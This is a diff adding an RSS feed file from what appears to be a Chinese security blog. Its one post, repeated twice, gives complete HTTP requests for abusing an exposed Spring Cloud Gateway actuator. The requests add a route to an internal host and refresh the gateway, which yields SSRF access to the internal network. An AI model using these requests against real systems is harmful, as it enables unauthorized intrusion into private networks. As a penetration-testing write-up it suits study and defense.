@@ -1,0 +1,156 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Spring on Ca1s1&#39;Blog</title>
+    <link>https://vuln.top/tags/spring/</link>
+    <description>Recent content in Spring on Ca1s1&#39;Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 25 May 2025 16:05:30 +0800</lastBuildDate><atom:link href="https://vuln.top/tags/spring/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Spring添加路由实现ssrf</title>
+      <link>https://vuln.top/posts/spring%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1%E5%AE%9E%E7%8E%B0ssrf/</link>
+      <pubDate>Sun, 25 May 2025 16:05:30 +0800</pubDate>
+      
+      <guid>https://vuln.top/posts/spring%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1%E5%AE%9E%E7%8E%B0ssrf/</guid>
+      <description>&lt;p&gt;在某个项目中遇到的gateway接口不支持spel表达式执行命令，但是通过实现ssrf内网漫游&lt;/p&gt;
+&lt;p&gt;查看Gateway/routedefinitions接口可以查看到所有的路由&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET /api/actuator/gateway/routedefinitions HTTP/2
+Host: localhost
+Content-Length: 0
+Sec-Ch-Ua-Platform: &amp;#34;macOS&amp;#34;
+Accept-Language: zh-CN,zh;q=0.9
+Sec-Ch-Ua: &amp;#34;Not?A_Brand&amp;#34;;v=&amp;#34;99&amp;#34;, &amp;#34;Chromium&amp;#34;;v=&amp;#34;130&amp;#34;
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: application/json, text/plain, */*
+Content-Type: application/json;charset=UTF-8
+Origin: https://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://localhost/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;修改http://xxxxxxx/为内网地址&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /api/actuator/gateway/routes/first HTTP/2
+Host: localhost
+Content-Length: 243
+Sec-Ch-Ua-Platform: &amp;#34;macOS&amp;#34;
+Accept-Language: zh-CN,zh;q=0.9
+Sec-Ch-Ua: &amp;#34;Not?A_Brand&amp;#34;;v=&amp;#34;99&amp;#34;, &amp;#34;Chromium&amp;#34;;v=&amp;#34;130&amp;#34;
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+Origin: https://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://localhost/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+{
+  &amp;#34;id&amp;#34;: &amp;#34;first&amp;#34;,
+  &amp;#34;predicates&amp;#34;: [{
+    &amp;#34;name&amp;#34;: &amp;#34;Path&amp;#34;,
+    &amp;#34;args&amp;#34;: {&amp;#34;_genkey_0&amp;#34;:&amp;#34;/api/aliyuncer/**&amp;#34;}
+  }],
+  &amp;#34;filters&amp;#34;: [
+      &amp;#34;StripPrefix=2&amp;#34;
+  ],
+  &amp;#34;uri&amp;#34;: &amp;#34;http://xxxxxxx/&amp;#34;,
+  &amp;#34;order&amp;#34;: -1
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /api/actuator/refresh HTTP/2
+Host: localhost
+Sec-Ch-Ua-Platform: &amp;#34;macOS&amp;#34;
+Accept-Language: zh-CN,zh;q=0.9
+Sec-Ch-Ua: &amp;#34;Not?A_Brand&amp;#34;;v=&amp;#34;99&amp;#34;, &amp;#34;Chromium&amp;#34;;v=&amp;#34;130&amp;#34;
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: application/json, text/plain, */*
+Origin: https://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://localhost/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+Content-Type: application/json
+Content-Length: 0
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后访问/api/aliyuncer/即为内网http://xxxxxxx/，通过burp编写替换路径的规则可以实现很方便访问内网的方法。&lt;/p&gt;</description>
+      <content>&lt;p&gt;在某个项目中遇到的gateway接口不支持spel表达式执行命令，但是通过实现ssrf内网漫游&lt;/p&gt;
+&lt;p&gt;查看Gateway/routedefinitions接口可以查看到所有的路由&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET /api/actuator/gateway/routedefinitions HTTP/2
+Host: localhost
+Content-Length: 0
+Sec-Ch-Ua-Platform: &amp;#34;macOS&amp;#34;
+Accept-Language: zh-CN,zh;q=0.9
+Sec-Ch-Ua: &amp;#34;Not?A_Brand&amp;#34;;v=&amp;#34;99&amp;#34;, &amp;#34;Chromium&amp;#34;;v=&amp;#34;130&amp;#34;
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: application/json, text/plain, */*
+Content-Type: application/json;charset=UTF-8
+Origin: https://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://localhost/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;修改http://xxxxxxx/为内网地址&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /api/actuator/gateway/routes/first HTTP/2
+Host: localhost
+Content-Length: 243
+Sec-Ch-Ua-Platform: &amp;#34;macOS&amp;#34;
+Accept-Language: zh-CN,zh;q=0.9
+Sec-Ch-Ua: &amp;#34;Not?A_Brand&amp;#34;;v=&amp;#34;99&amp;#34;, &amp;#34;Chromium&amp;#34;;v=&amp;#34;130&amp;#34;
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+Origin: https://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://localhost/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+{
+  &amp;#34;id&amp;#34;: &amp;#34;first&amp;#34;,
+  &amp;#34;predicates&amp;#34;: [{
+    &amp;#34;name&amp;#34;: &amp;#34;Path&amp;#34;,
+    &amp;#34;args&amp;#34;: {&amp;#34;_genkey_0&amp;#34;:&amp;#34;/api/aliyuncer/**&amp;#34;}
+  }],
+  &amp;#34;filters&amp;#34;: [
+      &amp;#34;StripPrefix=2&amp;#34;
+  ],
+  &amp;#34;uri&amp;#34;: &amp;#34;http://xxxxxxx/&amp;#34;,
+  &amp;#34;order&amp;#34;: -1
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /api/actuator/refresh HTTP/2
+Host: localhost
+Sec-Ch-Ua-Platform: &amp;#34;macOS&amp;#34;
+Accept-Language: zh-CN,zh;q=0.9
+Sec-Ch-Ua: &amp;#34;Not?A_Brand&amp;#34;;v=&amp;#34;99&amp;#34;, &amp;#34;Chromium&amp;#34;;v=&amp;#34;130&amp;#34;
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: application/json, text/plain, */*
+Origin: https://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://localhost/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+Content-Type: application/json
+Content-Length: 0
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后访问/api/aliyuncer/即为内网http://xxxxxxx/，通过burp编写替换路径的规则可以实现很方便访问内网的方法。&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
